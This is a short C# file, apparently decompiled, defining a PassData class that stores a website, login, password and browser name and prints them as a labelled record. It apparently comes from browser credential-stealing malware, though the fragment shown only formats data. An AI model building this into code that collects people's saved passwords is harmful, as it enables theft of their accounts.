namespace NoFile
{
    using System;
    using System.Runtime.CompilerServices;

    public class PassData
    {
        public override string ToString()
        {
            return string.Format("Website: {0}\r\nLogin: {1}\r\nPassword: {2}\r\nBrowser : {3}\r\n----------------------\r\n", new object[] { this.Url, this.Login, this.Password, this.Program });
        }

        public string Login { get; set; }

        public string Password { get; set; }

        public string Program { get; set; }

        public string Url { get; set; }
    }
}

